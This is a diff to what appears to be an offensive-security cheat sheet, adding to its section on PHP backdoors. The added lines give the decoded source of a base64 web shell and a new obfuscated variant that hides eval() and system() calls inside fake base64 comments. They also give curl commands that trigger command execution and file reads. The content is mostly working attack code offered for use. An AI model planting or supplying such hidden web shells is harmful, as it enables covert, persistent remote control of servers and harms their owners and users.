@@ -1635,6 +1635,10 @@ Add this line to the beginning of any PHP file:
 ```php
 <?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
 ```
+It is base64 encoding of:
+```php
+if(isset($_POST[0])){system($_POST[0]);die;}
+```
 
 Test the backdoor:
 ```sh
@@ -1644,6 +1648,25 @@ cd /var/www/html && php -S 127.0.0.1:8080
 curl http://127.0.0.1:8080/test.php
 ### With executing a command
 curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
+```
+
+Sometimes `system()` is prohibited. Add `eval()` to allow remote PHP-code execution as a backup. Hide within other base64-comments for some obfuscation:
+```php
+<?PHP /*1rUY9TDs2wG8In1HkSQzqViVtX2nGidgu/RkzKNJbfho9NqtfTaww4GcR6bIGU+U1AJq
+USOIjliQm4T/9HP6YS6IMhwoZzmr2iydbwDcVynDqtLjI5i7owLKmjbKnijTszoXP/dif9ZcbhtJ
+WQKmhCno0boYQQ2rjHgW3su1C7pYREPSdrYD/4QBpptJU7Djnm5zuyD2TXNjHXm/ZYUW+n4s3PM7
+aWqzWzy*/if(isset($_POST[0])){eval($_POST[1]?:"");system($_POST[0]);die;}/*P
+0KKBW1rvtqxOK8L9Ok6y7Rulkl2um62KVxvVx/+kODDw4HZV5Yx/HK/7lG+X/IkK8LViCIuaedXl
+HM1wHBlDluhe8BN6pH33fn0bfFpjCDaKrKwK3QF6ExJu1JgKK9deyWUTcqbr0dhe7ZliOIldh3of
++4qUjhVdK4SoeND/Dd+iwRAbhZKxaHfng4ADqdWrwjUPoyTjzOp6C3iDzunviiG0RC3iDuCY*/?>
+```
+
+Trigger with any of these to execute comand or PHP code:
+```shell
+# Execute just command
+curl http://127.0.0.1:8080/x.php -d0='id'
+# Execute just PHP code
+curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts");'
 ```
 
 <a id="ld-backdoor"></a>
